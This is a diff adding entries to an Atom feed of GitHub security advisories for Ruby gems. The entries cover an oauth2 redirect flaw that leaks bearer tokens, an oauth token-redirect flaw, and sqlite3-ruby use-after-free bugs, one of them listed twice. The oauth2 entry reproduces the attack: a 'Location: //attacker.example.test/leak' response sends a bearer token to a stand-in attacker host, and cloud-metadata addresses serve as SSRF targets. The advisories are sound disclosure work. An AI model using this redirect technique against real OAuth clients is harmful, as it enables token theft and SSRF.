@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/rubygems.rss</id>
     <title>Security Advisory for Ruby gems hosted at RubyGems.org</title>
-    <updated>2026-07-28T15:10:08.734Z</updated>
+    <updated>2026-07-28T17:16:52.656Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arubygems"/>
     <subtitle>Security Advisory for Ruby gems hosted at RubyGems.org on GitHub</subtitle>
@@ -11,6 +11,500 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[oauth2] OAuth2::Client#request: Protocol-relative redirect Location overrides authority, leaking bearer Authorization to attacker host]]></title>
+        <id>https://github.com/advisories/GHSA-pp92-crg2-gfv9</id>
+        <link href="https://github.com/advisories/GHSA-pp92-crg2-gfv9"/>
+        <updated>2026-07-28T16:32:45.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>When an application uses <code>OAuth2::Client</code> (typically via an <code>OAuth2::AccessToken</code>) and the configured authorization server returns a redirect whose <code>Location</code> header is a protocol-relative URI of the form <code>//attacker.example/leak</code>, <code>OAuth2::Client#request</code> resolves the redirect with <code>response.response.env.url.merge(location)</code>. Per RFC 3986 §5.2, an input that starts with <code>//</code> is a network-path reference and replaces the authority of the base URL: <code>URI("http://idp.trusted/userinfo").merge("//attacker.example/leak")</code> returns <code>http://attacker.example/leak</code>. The recursive <code>request(verb, full_location, req_opts)</code> call then re-sends the request to the attacker host while preserving the <code>Authorization: Bearer &lt;access-token&gt;</code> header that <code>OAuth2::AccessToken#configure_authentication!</code> installed on <code>req_opts[:headers]</code> for the original request.</p>
+<p>The result is a one-shot cross-origin credential disclosure: any 30x response from the IdP that an attacker can influence (a compromised endpoint, a tenant-controlled IdP in a multi-tenant deployment, or an open-redirect handler that does not normalise the <code>Location</code> it emits) can extract the bearer access token of the calling user.</p>
+<h2 id="affected">Affected</h2>
+<ul>
+<li><code>oauth2</code> v2.0.21 and all prior versions back to and including v0.4.0.<ul>
+<li>The underlying unsafe redirect-following behavior that reuses headers starts in v0.4.0 via <a href="https://github.com/ruby-oauth/oauth2/commit/b944da54cd70487c06d7252b9e4e7948eae56e73">https://github.com/ruby-oauth/oauth2/commit/b944da54cd70487c06d7252b9e4e7948eae56e73</a></li>
+<li>The vulnerability was retained when the code was refactored to a redirect helper, and in this form has been present in <code>OAuth2::Client#request</code> since v2.0.0 via <a href="https://github.com/ruby-oauth/oauth2/commit/b944da54cd70487c06d7252b9e4e7948eae56e73">https://github.com/ruby-oauth/oauth2/commit/b944da54cd70487c06d7252b9e4e7948eae56e73</a></li>
+</ul>
+</li>
+<li>Ruby 4.0.5 on <code>arm64-darwin25</code>. The behaviour of <code>URI#merge</code> for protocol-relative inputs is RFC-conformant and the same on every supported Ruby (≥ 2.x).</li>
+<li>Adapter independence: confirmed against the default <code>faraday</code> 2.14.2 + <code>faraday-net_http</code> 3.4.3 stack. The <code>URI#merge</code> call is in <code>oauth2</code> itself, not in Faraday, so the issue is not adapter-specific.</li>
+</ul>
+<h2 id="impact">Impact</h2>
+<p>A consumer that uses <code>OAuth2::AccessToken#get</code> / <code>#post</code> / <code>#request</code> against an IdP whose redirect target an attacker can influence (open redirect, malicious tenant, or in-path adversary) loses two things at once:</p>
+<ol>
+<li><strong>Cross-origin credential disclosure.</strong> The connection-scoped <code>Authorization: Bearer &lt;token&gt;</code> header attached by <code>OAuth2::AccessToken#configure_authentication!</code> is sent to the attacker host on the very next request, with no second user interaction.</li>
+<li><strong>SSRF from the application server.</strong> The OAuth2 client follows the redirect on behalf of the application, so the host that ultimately receives the request is one the attacker chooses — useful for hitting internal addresses (<code>//169.254.169.254/...</code>, <code>//127.0.0.1:.../...</code>) that the application server can reach but the attacker cannot.</li>
+</ol>
+<p>The combined primitive is stronger than the usual cross-origin-redirect leak because no application-level cooperation is required and no <code>Location: http://attacker/...</code> is needed — the protocol-relative <code>//attacker/x</code> form slips past naive scheme-based Location filters that allow same-scheme-implicit redirects.</p>
+<h2 id="vulnerable-code">Vulnerable code</h2>
+<p><a href="https://github.com/ruby-oauth/oauth2/blob/e2d509705db6091c8d5f27c31e29c58e39e51c7c/lib/oauth2/client.rb#L146-L182"><code>lib/oauth2/client.rb#L146-L182</code></a> at commit <code>e2d509705db6091c8d5f27c31e29c58e39e51c7c</code> (tag <code>v2.0.20</code>):</p>
+<pre><code class="language-ruby">def request(verb, url, req_opts = {}, &amp;block)
+  response = execute_request(verb, url, req_opts, &amp;block)
+  status = response.status
+
+  case status
+  when 301, 302, 303, 307
+    req_opts[:redirect_count] ||= 0
+    req_opts[:redirect_count] += 1
+    return response if req_opts[:redirect_count] &gt; options[:max_redirects]
+
+    if status == 303
+      verb = :get
+      req_opts.delete(:body)
+    end
+    location = response.headers["location"]
+    if location
+      full_location = response.response.env.url.merge(location)  # &lt;-- protocol-relative input replaces authority
+      request(verb, full_location, req_opts)
+    # ...
+</code></pre>
+<p><code>response.response.env.url</code> is the resolved URL of the prior request (always absolute, since Faraday's <code>build_exclusive_url</code> produces an absolute URI). <code>location</code> is the raw <code>Location</code> response header, with no validation. <code>URI#merge</code> follows RFC 3986 §5.2 and treats <code>//host/path</code> as a network-path reference, dropping the base authority and adopting the input's host. The recursive <code>request(verb, full_location, req_opts)</code> then re-enters with <code>req_opts</code> unchanged, which means any <code>Authorization</code> header that <code>OAuth2::AccessToken#configure_authentication!</code> placed in <code>req_opts[:headers]</code> for the original request travels with the redirected request to the attacker-controlled host.</p>
+<p>The credential plumbing is at <a href="https://github.com/ruby-oauth/oauth2/blob/e2d509705db6091c8d5f27c31e29c58e39e51c7c/lib/oauth2/access_token.rb#L376-L408"><code>lib/oauth2/access_token.rb#L376-L408</code></a>:</p>
+<pre><code class="language-ruby">def configure_authentication!(opts, verb)
+  # ...
+  case mode
+  when :header
+    opts[:headers] ||= {}
+    opts[:headers].merge!(headers)
+  # ...
+end
+
+def headers
+  {"Authorization" =&gt; options[:header_format] % token}
+end
+</code></pre>
+<p>The default token mode is <code>:header</code>, so every <code>AccessToken#get</code> / <code>#post</code> / <code>#request</code> call attaches <code>Authorization: Bearer &lt;token&gt;</code> to <code>req_opts[:headers]</code>. That same dictionary is then forwarded verbatim into the redirected request, because <code>Client#request</code> does not inspect or strip <code>req_opts[:headers]</code> when the redirect crosses origins.</p>
+<h2 id="reachable-in-production">Reachable in production</h2>
+<p>The vulnerable path is the documented <code>AccessToken#get</code> / <code>AccessToken#post</code> flow that every <code>oauth2</code> integration uses to call a resource server after the token exchange. The redirect handler is enabled unconditionally for status codes 301, 302, 303, and 307, up to <code>options[:max_redirects]</code> hops (default 5). No opt-in flag is required: a single 302 response with a protocol-relative <code>Location</code> header is enough to redirect the next request to an attacker host with the bearer token attached.</p>
+<p>Realistic upstream triggers:</p>
+<ol>
+<li><strong>Open redirect on the IdP.</strong> Many authorization servers expose endpoints that emit <code>Location</code> based on user input (for example logout flows, <code>redirect_uri</code> echoes, branded splash pages). When that endpoint does not normalise the user-supplied target, an attacker can plant <code>//attacker.example/leak</code> as the redirect target and induce the oauth2 client to follow it.</li>
+<li><strong>Tenant-controlled IdP.</strong> Multi-tenant SaaS where each tenant configures its own OIDC issuer URL via <code>OAuth2::Client.new(... , site: tenant_supplied_url)</code> allows a malicious tenant to set <code>site:</code> to its own server and emit the protocol-relative <code>Location</code> directly.</li>
+<li><strong>Compromised or downgraded IdP.</strong> A network-position adversary capable of altering a single response header before TLS termination (for example via a proxy that legitimately rewrites Location headers) can craft the protocol-relative form.</li>
+</ol>
+<p>In all three cases the access token is sent to the attacker host on the very next request: there is no second-hop redirect chain, no second user interaction, and no opportunity for the application to inspect the redirect target.</p>
+<h2 id="reproduction">Reproduction</h2>
+<p>The issue can be reproduced with a client using the default bearer-token header mode against an <code>oauth2</code> version before <code>2.0.22</code>.</p>
+<p>Minimal setup:</p>
+<pre><code class="language-ruby">require "oauth2"
+
+client = OAuth2::Client.new(
+  "client-id",
+  "client-secret",
+  site: "http://idp.example.test"
+)
+
+token = OAuth2::AccessToken.new(client, "SECRET-BEARER-TOKEN")
+token.get("/userinfo")
+</code></pre>
+<p>If the configured authorization/resource server responds to that request with a redirect such as:</p>
+<pre><code class="language-http">HTTP/1.1 302 Found
+Location: //attacker.example.test/leak
+Content-Length: 0
+</code></pre>
+<p>then vulnerable versions resolve the protocol-relative <code>Location</code> as a cross-origin URL and recursively issue the follow-up request while preserving the original request headers. Because <code>OAuth2::AccessToken</code> uses <code>Authorization: Bearer &lt;token&gt;</code> by default, the next request is sent to the attacker-controlled host with the bearer token attached:</p>
+<pre><code class="language-http">GET /leak HTTP/1.1
+Host: attacker.example.test
+Authorization: Bearer SECRET-BEARER-TOKEN
+</code></pre>
+<p>This requires no special Faraday adapter behavior. The vulnerable redirect handling is in <code>OAuth2::Client#request</code>; the attacker-controlled input is the raw <code>Location</code> header value from a 30x response.</p>
+<h3 id="patched-build-verification">Patched-build verification</h3>
+<p>Monkey-patch <code>OAuth2::Client#request</code> so that protocol-relative <code>Location</code> values are forced down the relative-path branch of <code>URI#merge</code> by prepending <code>./</code>. Re-run the attack against the same <code>poc_collector.rb</code> instance.</p>
+<pre><code class="language-ruby">module OAuth2
+  class Client
+    def request(verb, url, req_opts = {}, &amp;block)
+      response = execute_request(verb, url, req_opts, &amp;block)
+      status = response.status
+      case status
+      when 301, 302, 303, 307
+        req_opts[:redirect_count] ||= 0
+        req_opts[:redirect_count] += 1
+        return response if req_opts[:redirect_count] &gt; options[:max_redirects]
+        verb = :get and req_opts.delete(:body) if status == 303
+        location = response.headers["location"]
+        if location
+          # PATCH: neutralise protocol-relative location before URI#merge.
+          safe_location = location.start_with?("//") ? "./#{location}" : location
+          full_location = response.response.env.url.merge(safe_location)
+          request(verb, full_location, req_opts)
+        else
+          raise(Error.new(response), "Got #{status} status code, but no Location header was present")
+        end
+      # ... unchanged fallthrough ...
+      end
+    end
+  end
+end
+</code></pre>
+<p>After applying the patch, the same <code>token.get("/userinfo")</code> call resolves the attack <code>Location: //127.0.0.1:4568/leak</code> to <code>http://127.0.0.1:4567/127.0.0.1:4568/leak</code> — same host as the IdP — and <code>:4568</code> never receives the bearer token. The IdP redirect loop trips <code>max_redirects</code> and the helper returns <code>status: 302</code> to the caller with no off-host request. Collector log after the patched run shows <code>:4568</code> LEAK count unchanged from the negative control:</p>
+<pre><code class="language-text">[idp:4567] hit  req_line=GET /userinfo HTTP/1.1  auth="Bearer SECRET-BEARER-XYZZY"
+[idp:4567] hit  req_line=GET ///127.0.0.1:4568/leak HTTP/1.1  auth="Bearer SECRET-BEARER-XYZZY"
+[idp:4567] hit  req_line=GET ///127.0.0.1:4568///127.0.0.1:4568/leak HTTP/1.1  auth="Bearer SECRET-BEARER-XYZZY"
+</code></pre>
+<p>All hops stay on <code>127.0.0.1:4567</code>. The bearer token never leaves the IdP.</p>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>Treat protocol-relative <code>Location</code> values as relative paths when resolving against the prior request URL. The smallest local fix is the <code>./</code> prefix used in <code>Faraday::Connection#build_exclusive_url</code> for the same primitive (see lines 485-488 of <code>faraday/lib/faraday/connection.rb</code>):</p>
+<pre><code class="language-ruby">location = response.headers["location"]
+if location
+  # Force protocol-relative inputs to be interpreted as relative paths so they
+  # cannot override the base authority via RFC 3986 §5.2 network-path reference.
+  safe_location = location.respond_to?(:start_with?) &amp;&amp; location.start_with?("//") \
+    ? "./#{location}" : location
+  full_location = response.response.env.url.merge(safe_location)
+  request(verb, full_location, req_opts)
+</code></pre>
+<p>A defence-in-depth follow-up is to also strip credential-bearing headers (<code>Authorization</code>, plus any custom headers configured via <code>header_format</code>) from <code>req_opts[:headers]</code> when the resolved host changes across the redirect, which mirrors how Mechanize handles cross-host redirects in <code>lib/mechanize/http/agent.rb#L1068-L1077</code>. That additional check protects against the orthogonal case where an attacker controls an absolute <code>Location: http://attacker.example/...</code> value on a same-host open-redirect endpoint.</p>
+<h2 id="credit">Credit</h2>
+<p>Reported by tonghuaroot.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/ruby-oauth/oauth2/security/advisories/GHSA-pp92-crg2-gfv9">https://github.com/ruby-oauth/oauth2/security/advisories/GHSA-pp92-crg2-gfv9</a></li>
+<li><a href="https://github.com/ruby-oauth/oauth2/commit/0f0a474f1b38453e119e660c2daca742d4378ce9">https://github.com/ruby-oauth/oauth2/commit/0f0a474f1b38453e119e660c2daca742d4378ce9</a></li>
+<li><a href="https://github.com/ruby-oauth/oauth2/releases/tag/v2.0.22">https://github.com/ruby-oauth/oauth2/releases/tag/v2.0.22</a></li>
+<li><a href="https://github.com/advisories/GHSA-pp92-crg2-gfv9">https://github.com/advisories/GHSA-pp92-crg2-gfv9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-pp92-crg2-gfv9</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-28T16:32:45.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[oauth] OAuth: Cross-origin token-request redirects can expose signed request metadata]]></title>
+        <id>https://github.com/advisories/GHSA-prq8-7wvh-44qh</id>
+        <link href="https://github.com/advisories/GHSA-prq8-7wvh-44qh"/>
+        <updated>2026-07-28T16:27:14.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="cross-origin-oauth-token-request-redirects-can-expose-signed-request-metadata">Cross-origin OAuth token-request redirects can expose signed request metadata</h1>
+<h2 id="summary">Summary</h2>
+<p>When an application uses <code>OAuth::Consumer</code> to request OAuth 1.0 request tokens or
+access tokens, the token request helper follows <code>300..399</code> redirects returned by
+the OAuth server. In affected versions, <code>OAuth::Consumer#token_request</code> parses the
+raw <code>Location</code> header, follows the redirect recursively, and can mutate the
+consumer's configured <code>site</code> when the redirect points to a different host with
+the same path.</p>
+<p>The result is a cross-origin signed-request disclosure primitive: if an OAuth
+server token endpoint returns a redirect whose target an attacker controls, the
+client can re-sign the token request and send OAuth 1.0 request metadata,
+including the OAuth signature, nonce, timestamp, consumer key, and any request
+parameters included in the signature base string, to the attacker-controlled
+host. The same behavior can also be used as an SSRF or confused-deputy primitive
+because the application server follows the redirect and sends the next request
+from its own network position.</p>
+<h2 id="affected">Affected</h2>
+<ul>
+<li><code>oauth</code> v1.1.5 and prior versions back to and including v0.5.5.<ul>
+<li>The cross-host token redirect behavior was introduced by
+<a href="https://github.com/ruby-oauth/oauth/commit/d74b767f">https://github.com/ruby-oauth/oauth/commit/d74b767f</a></li>
+<li>The behavior is documented in the v0.5.5 changelog as "Allow redirect to
+different host but same path".</li>
+</ul>
+</li>
+<li>The vulnerable behavior is in <code>OAuth::Consumer#token_request</code>, which is used by
+the documented request-token and access-token flows.</li>
+<li>The issue is not specific to a Ruby engine or platform. It is caused by the
+gem's redirect handling and recursive token request behavior.</li>
+</ul>
+<p>Patched version: <code>oauth</code> v1.1.6.</p>
+<h2 id="impact">Impact</h2>
+<p>A consumer that calls <code>OAuth::Consumer#get_request_token</code>,
+<code>OAuth::Consumer#get_access_token</code>, or lower-level token request helpers against
+an OAuth server whose token endpoint redirect target can be influenced may lose
+three security properties:</p>
+<ol>
+<li><strong>Cross-origin signed-request metadata disclosure.</strong> The redirected request is
+signed for the attacker-controlled endpoint. Depending on the request method,
+scheme, and parameters, the attacker may receive OAuth 1.0 parameters such as
+<code>oauth_consumer_key</code>, <code>oauth_signature_method</code>, <code>oauth_timestamp</code>,
+<code>oauth_nonce</code>, <code>oauth_version</code>, and <code>oauth_signature</code>.</li>
+<li><strong>SSRF from the application server.</strong> The OAuth client follows the redirect on
+behalf of the application, so the redirected host is contacted from the
+application server's network position.</li>
+<li><strong>Confused-deputy behavior.</strong> A malicious or compromised token endpoint can
+cause an otherwise trusted application to initiate signed requests to an
+unintended origin.</li>
+</ol>
+<p>The disclosed OAuth 1 signature is not equivalent to an OAuth 2 bearer token: it
+is bound to the signed request, timestamp, nonce, HTTP method, and request URL.
+However, it can still disclose sensitive integration metadata, may be replayable
+within the receiver's accepted nonce/timestamp window in some deployments, and
+can expose application-server reachability to attacker-selected hosts.</p>
+<h2 id="vulnerable-code">Vulnerable code</h2>
+<p><a href="https://github.com/ruby-oauth/oauth/blob/v1.1.5/lib/oauth/consumer.rb"><code>lib/oauth/consumer.rb</code></a>
+at tag <code>v1.1.5</code>:</p>
+<pre><code class="language-ruby">def token_request(http_method, path, token = nil, request_options = {}, *arguments)
+  request_options[:token_request] ||= true
+  response = request(http_method, path, token, request_options, *arguments)
+  case response.code.to_i
+
+  when (200..299)
+    # parse token response
+  when (300..399)
+    # Parse redirect to follow
+    uri = URI.parse(response["location"])
+    our_uri = URI.parse(site)
+
+    # Guard against infinite redirects
+    response.error! if uri.path == path &amp;&amp; our_uri.host == uri.host
+
+    if uri.path == path &amp;&amp; our_uri.host != uri.host
+      options[:site] = "#{uri.scheme}://#{uri.host}"
+      @http = create_http
+    end
+
+    token_request(http_method, uri.path, token, request_options, arguments)
+  when (400..499)
+    raise OAuth::Unauthorized, response
+  else
+    response.error!
+  end
+end
+</code></pre>
+<p>The vulnerable behavior has several parts:</p>
+<ul>
+<li><code>response["location"]</code> is trusted as the next token request target.</li>
+<li>Redirects are followed for every <code>300..399</code> response.</li>
+<li>There is no general redirect counter or maximum redirect limit.</li>
+<li>Cross-host redirects with the same path can mutate <code>options[:site]</code> and rebuild
+the underlying HTTP client.</li>
+<li>The recursive call continues the token request flow and signs the next request
+for the redirected destination.</li>
+</ul>
+<h2 id="reachable-in-production">Reachable in production</h2>
+<p>The vulnerable path is reachable through the normal OAuth 1 token exchange:</p>
+<pre><code class="language-ruby">consumer = OAuth::Consumer.new(
+  consumer_key,
+  consumer_secret,
+  site: "https://provider.example"
+)
+
+request_token = consumer.get_request_token
+</code></pre>
+<p>If <code>https://provider.example/oauth/request_token</code> returns a redirect to an
+attacker-controlled host, the library follows that redirect as part of the token
+request flow. A realistic trigger is an OAuth provider, gateway, or reverse proxy
+that emits <code>Location</code> based on user-controlled or tenant-controlled input, or a
+malicious tenant-controlled OAuth endpoint in a multi-tenant integration.</p>
+<p>No application-level redirect handling is required. The redirect is followed
+inside the gem before the application receives the token response.</p>
+<h2 id="reproduction">Reproduction</h2>
+<p>A vulnerable application is one that uses <code>OAuth::Consumer</code> to perform an OAuth
+1 token exchange against a token endpoint that can be made to return a redirect
+to another origin.</p>
+<p>Example shape:</p>
+<pre><code class="language-ruby">consumer = OAuth::Consumer.new(
+  consumer_key,
+  consumer_secret,
+  site: "https://provider.example"
+)
+
+consumer.get_request_token
+</code></pre>
+<p>If <code>https://provider.example/oauth/request_token</code> responds with a <code>30x</code> redirect
+whose <code>Location</code> points to <code>https://attacker.example/...</code>, affected versions may
+follow that redirect as part of the token request flow. The redirected request is
+then generated and signed by the application server for the new destination.
+Depending on the configured OAuth request scheme, OAuth 1 parameters may be sent
+in the <code>Authorization</code> header, request body, or query string.</p>
+<p>Expected vulnerable behavior:</p>
+<ul>
+<li>the token request leaves the configured OAuth provider origin;</li>
+<li>the redirected host receives a signed OAuth 1 token request;</li>
+<li>the application does not get a chance to inspect or approve the redirect target
+before the redirected request is sent.</li>
+</ul>
+<p>Expected patched behavior:</p>
+<ul>
+<li>same-origin redirects continue to work, subject to a redirect limit;</li>
+<li>cross-origin token endpoint redirects are rejected by default;</li>
+<li>applications that intentionally require cross-origin token redirects must opt
+in explicitly with <code>token_request_cross_origin_redirects</code>.</li>
+</ul>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>Reject cross-origin token endpoint redirects by default and require explicit
+opt-in for integrations that intentionally depend on that behavior.</p>
+<p>The fix released in v1.1.6 does the following:</p>
+<pre><code class="language-ruby">current_uri = token_request_uri(path)
+redirected_uri = token_request_redirect_uri(current_uri, response)
+response.error! unless redirected_uri
+
+redirect_count = request_options[:token_request_redirect_count].to_i + 1
+response.error! if redirect_count &gt; token_request_max_redirects(request_options)
+response.error! if token_request_cross_origin?(current_uri, redirected_uri) &amp;&amp;
+  !token_request_cross_origin_redirects?(request_options)
+
+redirect_options = request_options.merge(token_request_redirect_count: redirect_count)
+token_request(http_method, token_request_redirect_path(current_uri, redirected_uri), token, redirect_options, *arguments, &amp;block)
+</code></pre>
+<p>The fix intentionally preserves same-origin redirect compatibility while making
+cross-origin token endpoint redirects an explicit choice. It also avoids placing
+internal redirect state in <code>request_options</code> passed to OAuth signing.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>Until a patched release is available, applications can reduce exposure by doing
+one or more of the following:</p>
+<ul>
+<li>Ensure configured OAuth token endpoints are fixed absolute URLs controlled by a
+trusted provider.</li>
+<li>Do not use tenant-controlled OAuth token endpoint URLs unless the tenant is
+trusted to receive signed OAuth token requests.</li>
+<li>Block outbound application-server traffic to internal metadata services and
+other sensitive internal addresses at the network layer.</li>
+<li>Place a trusted proxy in front of OAuth providers that rejects token endpoint
+redirects to a different origin.</li>
+</ul>
+<p>These mitigations reduce exploitability but do not remove the vulnerable redirect
+logic from the gem.</p>
+<h2 id="credit">Credit</h2>
+<p>Found during the follow-up audit for <code>GHSA-pp92-crg2-gfv9</code>.</p>
+<p>Reporter/coordinator: Peter H. Boling (<code>pboling</code>).</p>
+<h2 id="references">References</h2>
+<ul>
+<li>Related OAuth 2 advisory: <a href="https://github.com/ruby-oauth/oauth2/security/advisories/GHSA-pp92-crg2-gfv9">https://github.com/ruby-oauth/oauth2/security/advisories/GHSA-pp92-crg2-gfv9</a></li>
+<li>Fixed version: <code>oauth</code> v1.1.6</li>
+<li>Behavior-introducing commit: <a href="https://github.com/ruby-oauth/oauth/commit/d74b767f">https://github.com/ruby-oauth/oauth/commit/d74b767f</a></li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/ruby-oauth/oauth/security/advisories/GHSA-prq8-7wvh-44qh">https://github.com/ruby-oauth/oauth/security/advisories/GHSA-prq8-7wvh-44qh</a></li>
+<li><a href="https://github.com/ruby-oauth/oauth/commit/d069dc8c4c9631947451215f07460d6cdf0caf3f">https://github.com/ruby-oauth/oauth/commit/d069dc8c4c9631947451215f07460d6cdf0caf3f</a></li>
+<li><a href="https://github.com/ruby-oauth/oauth/releases/tag/v1.1.6">https://github.com/ruby-oauth/oauth/releases/tag/v1.1.6</a></li>
+<li><a href="https://github.com/advisories/GHSA-prq8-7wvh-44qh">https://github.com/advisories/GHSA-prq8-7wvh-44qh</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-prq8-7wvh-44qh</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-28T16:27:11.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[sqlite3] sqlite3-ruby has Use-After-Free in SQLite Aggregate Function Callbacks]]></title>
+        <id>https://github.com/advisories/GHSA-j7fr-3v8c-3qc3</id>
+        <link href="https://github.com/advisories/GHSA-j7fr-3v8c-3qc3"/>
+        <updated>2026-07-28T16:23:59.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Using <code>Database#create_aggregate</code>, <code>#create_aggregate_handler</code>, or <code>Database#define_aggregator</code> to define an aggregate function, and then using an open statement calling that function after the database has been explicitly closed will result in an invalid memory read and a segmentation fault.</p>
+<h2 id="mitigation">Mitigation</h2>
+<p>Upgrade to sqlite3 gem v2.9.5 or later.</p>
+<p>As a workaround, avoid using an aggregate function after closing the database.</p>
+<h2 id="severity">Severity</h2>
+<p>The sqlite3-ruby maintainers assess this as Low severity. It is reliably triggered after GC when code is structured in a particular way. There is no known general exploit that could be used as a denial of service attack.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/security/advisories/GHSA-j7fr-3v8c-3qc3">https://github.com/sparklemotion/sqlite3-ruby/security/advisories/GHSA-j7fr-3v8c-3qc3</a></li>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/pull/711">https://github.com/sparklemotion/sqlite3-ruby/pull/711</a></li>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/commit/b24e1e6076528b7f95f99acf7a81c70d0004c726">https://github.com/sparklemotion/sqlite3-ruby/commit/b24e1e6076528b7f95f99acf7a81c70d0004c726</a></li>
+<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sqlite3/CVE-2026-54620.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sqlite3/CVE-2026-54620.yml</a></li>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/releases/tag/v2.9.5">https://github.com/sparklemotion/sqlite3-ruby/releases/tag/v2.9.5</a></li>
+<li><a href="https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-54620">https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-54620</a></li>
+<li><a href="https://github.com/advisories/GHSA-j7fr-3v8c-3qc3">https://github.com/advisories/GHSA-j7fr-3v8c-3qc3</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-j7fr-3v8c-3qc3</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-07-28T16:23:57.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[sqlite3-ruby] sqlite3-ruby has Use-After-Free in SQLite Aggregate Function Callbacks]]></title>
+        <id>https://github.com/advisories/GHSA-j7fr-3v8c-3qc3</id>
+        <link href="https://github.com/advisories/GHSA-j7fr-3v8c-3qc3"/>
+        <updated>2026-07-28T16:23:59.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Using <code>Database#create_aggregate</code>, <code>#create_aggregate_handler</code>, or <code>Database#define_aggregator</code> to define an aggregate function, and then using an open statement calling that function after the database has been explicitly closed will result in an invalid memory read and a segmentation fault.</p>
+<h2 id="mitigation">Mitigation</h2>
+<p>Upgrade to sqlite3 gem v2.9.5 or later.</p>
+<p>As a workaround, avoid using an aggregate function after closing the database.</p>
+<h2 id="severity">Severity</h2>
+<p>The sqlite3-ruby maintainers assess this as Low severity. It is reliably triggered after GC when code is structured in a particular way. There is no known general exploit that could be used as a denial of service attack.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/security/advisories/GHSA-j7fr-3v8c-3qc3">https://github.com/sparklemotion/sqlite3-ruby/security/advisories/GHSA-j7fr-3v8c-3qc3</a></li>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/pull/711">https://github.com/sparklemotion/sqlite3-ruby/pull/711</a></li>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/commit/b24e1e6076528b7f95f99acf7a81c70d0004c726">https://github.com/sparklemotion/sqlite3-ruby/commit/b24e1e6076528b7f95f99acf7a81c70d0004c726</a></li>
+<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sqlite3/CVE-2026-54620.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sqlite3/CVE-2026-54620.yml</a></li>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/releases/tag/v2.9.5">https://github.com/sparklemotion/sqlite3-ruby/releases/tag/v2.9.5</a></li>
+<li><a href="https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-54620">https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-54620</a></li>
+<li><a href="https://github.com/advisories/GHSA-j7fr-3v8c-3qc3">https://github.com/advisories/GHSA-j7fr-3v8c-3qc3</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-j7fr-3v8c-3qc3</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-07-28T16:23:57.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[sqlite3] sqlite3-ruby has Use-After-Free When Redefining SQLite Functions with Different Arity]]></title>
+        <id>https://github.com/advisories/GHSA-28hh-pr2h-2w89</id>
+        <link href="https://github.com/advisories/GHSA-28hh-pr2h-2w89"/>
+        <updated>2026-07-28T16:21:33.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Using <code>Database#create_function</code> or <code>Database#define_function</code> to define the same function name more than once with different numbers of arguments ("arity") or text encodings will result in a invalid memory read and a segmentation fault.</p>
+<h2 id="mitigation">Mitigation</h2>
+<p>Upgrade to sqlite3 gem v2.9.5 or later.</p>
+<p>As a workaround, avoid defining multiple custom functions with the same name (varying numbers of arguments or encoding).</p>
+<h2 id="severity">Severity</h2>
+<p>The sqlite3-ruby maintainers assess this as Low severity. It is reliably triggered after GC when code is structured in a particular way. There is no known general exploit that could be used as a denial of service attack.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/security/advisories/GHSA-28hh-pr2h-2w89">https://github.com/sparklemotion/sqlite3-ruby/security/advisories/GHSA-28hh-pr2h-2w89</a></li>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/pull/710">https://github.com/sparklemotion/sqlite3-ruby/pull/710</a></li>
+<li><a href="https://github.com/sparklemotion/sqlite3-ruby/commit/2bd436d17f77cdd4c31b00fe9d50b0d21cbaf033">https://github.com/sparklemotion/sqlite3-ruby/commit/2bd436d17f77cdd4c31b00fe9d50b0d21cbaf033</a></li>
